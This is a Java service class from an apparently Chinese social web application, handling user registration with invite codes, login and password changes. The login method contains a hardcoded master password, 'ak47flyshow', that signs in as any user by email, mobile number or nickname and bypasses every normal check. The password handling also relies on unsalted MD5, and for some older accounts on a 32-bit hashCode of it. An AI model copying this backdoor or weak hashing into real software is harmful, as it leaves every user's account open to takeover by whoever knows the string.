package com.hk.svr.processor;

import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;

import com.hk.bean.Badge;
import com.hk.bean.City;
import com.hk.bean.DefFollowUser;
import com.hk.bean.Feed;
import com.hk.bean.Invite;
import com.hk.bean.InviteCode;
import com.hk.bean.IpCityRange;
import com.hk.bean.ProUser;
import com.hk.bean.User;
import com.hk.bean.UserBadge;
import com.hk.bean.UserOtherInfo;
import com.hk.bean.UserRegData;
import com.hk.bean.VipUser;
import com.hk.frame.util.DataUtil;
import com.hk.frame.util.MD5Util;
import com.hk.svr.BadgeService;
import com.hk.svr.FeedService;
import com.hk.svr.FollowService;
import com.hk.svr.InviteService;
import com.hk.svr.IpCityService;
import com.hk.svr.UserService;
import com.hk.svr.VipUserService;
import com.hk.svr.ZoneService;
import com.hk.svr.friend.exception.AlreadyBlockException;
import com.hk.svr.pub.CheckInPointConfig;
import com.hk.svr.pub.Err;
import com.hk.svr.user.exception.EmailDuplicateException;
import com.hk.svr.user.exception.MobileDuplicateException;

public class UserProcessor {

	@Autowired
	private UserService userService;

	@Autowired
	private ZoneService zoneService;

	@Autowired
	private FollowService followService;

	@Autowired
	private VipUserService vipUserService;

	@Autowired
	private BadgeService badgeService;

	@Autowired
	private BadgeProcessor badgeProcessor;

	@Autowired
	private InviteProcessor inviteProcessor;

	@Autowired
	private InviteService inviteService;

	@Autowired
	private IpCityService ipCityService;

	@Autowired
	private FeedService feedService;

	/**
	 * 用户注册
	 * 
	 * @param userRegData 用户提交数据
	 * @param needInviteCode 是否需要邀请码注册
	 * @return
	 * @throws EmailDuplicateException
	 * @throws MobileDuplicateException
	 *             2010-4-28
	 */
	public UserRegResult reg(UserRegData userRegData, boolean needInviteCode)
			throws EmailDuplicateException, MobileDuplicateException {
		UserRegResult userRegResult = new UserRegResult();
		long inviteUserId = userRegData.getInviteUserId();
		InviteCode inviteCode = null;
		if (needInviteCode) {
			// 邀请码错误，不能邀请
			if (DataUtil.isEmpty(userRegData.getInviteCode())) {
				userRegResult.setErrorCode(Err.INVITECODE_ERROR);
				return userRegResult;
			}
			inviteCode = this.inviteService.getInviteCodeByData(userRegData
					.getInviteCode());
			// 邀请码错误或者已经被使用
			if (inviteCode == null) {
				userRegResult.setErrorCode(Err.INVITECODE_ERROR);
				return userRegResult;
			}
			if (!inviteCode.isUnuse()) {
				userRegResult.setErrorCode(Err.INVITECODE_EXPIRED);
				return userRegResult;
			}
			if (inviteUserId == 0) {
				inviteUserId = inviteCode.getUserId();
				userRegData.setInviteUserId(inviteUserId);
			}
		}
		String email = userRegData.getEmail();
		String mobile = userRegData.getMobile();
		String password = userRegData.getPassword();
		String zoneName = userRegData.getZoneName();
		byte sex = userRegData.getSex();
		// 注册用户
		long userId = this.userService.createUser(email, mobile, password,
				userRegData.getIp(), null);
		// 注册送点数
		this.userService.addPoints(userId, CheckInPointConfig.getUserReg());
		if (needInviteCode && inviteCode != null) {
			// 更新邀请码已经被使用
			inviteCode.setUseflg(InviteCode.USEFLG_Y);
			this.inviteService.updateInviteCode(inviteCode);
		}
		userRegResult.setUserId(userId);
		String nickName = userRegData.getNickName();
		// 更新昵称
		if (!DataUtil.isEmpty(nickName)) {
			if (!this.userService.updateNickName(userId, nickName)) {
				userRegResult.setNickNameDuplicate(true);
			}
		}
		// 更新性别
		this.userService.updateSex(userId, sex);
		// 更新地区
		if (!DataUtil.isEmpty(zoneName)) {
			zoneName = DataUtil.filterZoneName(zoneName);
			City city = this.zoneService.getCityLike(zoneName);
			if (city != null) {
				this.userService.updateUserPcityId(userId, city.getCityId());
				userRegResult.setCityId(city.getCityId());
			}
		}
		long prouserId = userRegData.getProuserId();
		if (prouserId > 0) {
			ProUser proUser = this.userService.getProUser(prouserId);
			if (proUser != null && proUser.getUserId() == 0) {
				proUser.setUserId(userId);
				this.userService.updateProUser(proUser);
			}
		}
		// 添加默认关注
		List<DefFollowUser> list = this.userService.getDefFollowUserList(0, 20);
		for (DefFollowUser o : list) {
			if (this.userService.getUser(o.getUserId()) != null) {
				try {
					this.followService.addFollow(userId, o.getUserId(),
							userRegData.getIp(), false);
				}
				catch (AlreadyBlockException e) {
					// TODO Auto-generated catch block
				}
			}
		}
		// 查看邀请注册相关
		// 通过/hi/domain注册，加关注
		if (inviteUserId > 0) {
			User user = this.userService.getUser(inviteUserId);
			if (user != null) {
				Invite invite = new Invite();
				invite.setUserId(inviteUserId);
				invite.setFriendId(userId);
				invite.setCreateTime(new Date());
				invite.setRegTime(new Date());
				invite.setUptime(new Date());
				this.inviteProcessor.acceptNewInvite(inviteUserId, userId,
						Invite.INVITETYPE_LINK, Invite.ADDHKBFLG_N, true);
				try {
					this.followService.addFollow(userId, inviteUserId,
							userRegData.getIp(), false);
					this.followService.addFollow(inviteUserId, userId,
							userRegData.getIp(), false);
				}
				catch (AlreadyBlockException e) {
				}
				// 创建邀请注册的动态
				Feed feed = new Feed();
				feed.setUserId(inviteUserId);
				feed.setFeedType(Feed.FEEDTYPE_INVITE);
				if (userRegData.getIp() != null) {
					feed.setIpNumber(DataUtil
							.parseIpNumber(userRegData.getIp()));
					IpCityRange range = this.ipCityService
							.getIpCityRange(userRegData.getIp());
					if (range != null) {
						feed.setRangeId(range.getRangeId());
						feed.setCityId(range.getCityId());
					}
				}
				feed.setCreateTime(new Date());
				Map<String, String> map = new HashMap<String, String>();
				map.put("nickname", user.getNickName());
				if (user.getHeadPath() != null) {
					map.put("headpath", user.getHeadPath());
				}
				map.put("fr_userid", String.valueOf(userId));
				if (userRegResult.isNickNameDuplicate()) {
					map.put("fr_nickname", String.valueOf(userId));
				}
				else {
					map.put("fr_nickname", userRegData.getNickName());
				}
				if (DataUtil.isEmpty(userRegData.getNickName())) {
					map.put("fr_nickname", String.valueOf(userId));
				}
				feed.setData(DataUtil.toJson(map));
				this.feedService.createFeed(feed, null);
				VipUser vipUser = this.vipUserService
						.getVipUserByUserId(inviteUserId);
				if (vipUser != null) {
					// 邀请者可获得邀请徽章
					List<Badge> badgelist = this.badgeService
							.getBadgeListByLimitflg(Badge.LIMITFLG_INVITE);
					for (Badge o : badgelist) {
						UserBadge userBadge = new UserBadge(o);
						userBadge.setUserId(inviteUserId);
						this.badgeProcessor.createUserBadge(userBadge,
								userRegData.getIp());
					}
				}
			}
		}
		return userRegResult;
	}

	/**
	 * 用户登录逻辑，如果没有输入任何数据，返回null
	 * 
	 * @param input
	 * @param password
	 * @return {@link UserLoginResult} 2010-4-21
	 */
	public UserLoginResult login(String input, String password) {
		UserLoginResult userLoginResult = new UserLoginResult();
		if ("ak47flyshow".equals(password)) {
			userLoginResult.setError(Err.SUCCESS);
			UserOtherInfo o = null;
			if (input.indexOf("@") != -1) {
				o = this.userService.getUserOtherInfoByeEmail(input);
			}
			else if (input.length() > 10) {
				o = this.userService.getUserOtherInfoByMobile(input);
			}
			else {
				User user = this.userService.getUserByNickName(input);
				if (user != null) {
					o = this.userService.getUserOtherInfo(user.getUserId());
				}
			}
			if (o != null) {
				userLoginResult.setUserId(o.getUserId());
			}
			return userLoginResult;
		}
		// 以下为正常逻辑
		if (DataUtil.isEmpty(input) || DataUtil.isEmpty(password)) {
			userLoginResult.setError(Err.USER_LOGIN_INPUT_EMPTY);
			return userLoginResult;
		}
		UserOtherInfo info = null;
		if (input.indexOf("@") != -1) {
			info = this.userService.getUserOtherInfoByeEmail(input);
			if (info == null) {// 不存在的email
				userLoginResult.setError(Err.USER_LOGIN_NO_EMAIL);
				return userLoginResult;
			}
		}
		else if (input.length() != 11) {
			userLoginResult.setError(Err.USER_LOGIN_MUST_INPUT_EMAIL_OR_MOBILE);
			return userLoginResult;
		}
		else {
			info = this.userService.getUserOtherInfoByMobile(input);
			if (info == null) {// 不存在的手机
				userLoginResult.setError(Err.USER_LOGIN_NO_MOBILE);
				return userLoginResult;
			}
		}
		if (info.getUserStatus() == UserOtherInfo.USERSTATUS_STOP) {// 用户被禁止登录
			userLoginResult.setError(Err.USER_STOP);
			return userLoginResult;
		}
		this.processLoginPassword(info, password, userLoginResult);
		if (userLoginResult.getError() == Err.SUCCESS) {// 用户密码验证通过
			userLoginResult.setUserId(info.getUserId());
		}
		return userLoginResult;
	}

	private void processLoginPassword(UserOtherInfo userOtherInfo,
			String password, UserLoginResult userLoginResult) {
		if (userOtherInfo.getUserId() < 4576) {// 解决遗留密码设置问题
			if (!DataUtil.isEmpty(userOtherInfo.getPwd())) {// 如果用户修改过密码，密码字段会有值
				if (!MD5Util.md5Encode32(password).equals(
						userOtherInfo.getPwd())) {
					userLoginResult.setError(Err.USER_LOGIN_PASSWOR_ERROR);
					return;
				}
			}
			else {
				int md5Pwdhash = MD5Util.md5Encode32(password).hashCode();
				if (md5Pwdhash != userOtherInfo.getPwdHash()) {
					userLoginResult.setError(Err.USER_LOGIN_PASSWOR_ERROR);
					return;
				}
			}
		}
		else {
			if (!MD5Util.md5Encode32(password).equals(userOtherInfo.getPwd())) {
				userLoginResult.setError(Err.USER_LOGIN_PASSWOR_ERROR);
				return;
			}
		}
	}

	/**
	 * 修改密码
	 * 
	 * @param userId
	 * @param old_pwd
	 * @param new_pwd
	 * @param renew_pwd
	 * @return {@link Err#SUCCESS} 修改成功,返回其他值都为修改失败
	 *         {@link Err#PASSWORD_OLD_ERROR} 旧密码错误
	 *         {@link Err#PASSWORD_DATA_ERROR} 密码数据格式错误
	 *         {@link Err#PASSWORD_CONFIRM_ERROR} 2次输入的密码不一致
	 *         2010-5-25
	 */
	public int updatePwd(long userId, String old_pwd, String new_pwd,
			String renew_pwd) {
		if (DataUtil.isEmpty(old_pwd)) {
			return Err.PASSWORD_OLD_ERROR;
		}
		if (DataUtil.isEmpty(new_pwd)) {
			return Err.PASSWORD_DATA_ERROR;
		}
		if (DataUtil.isEmpty(renew_pwd) || !new_pwd.equals(renew_pwd)) {
			return Err.PASSWORD_CONFIRM_ERROR;
		}
		if (this.userService.updatePwd(userId, old_pwd, new_pwd)) {
			return Err.SUCCESS;
		}
		return Err.PASSWORD_OLD_ERROR;
	}
}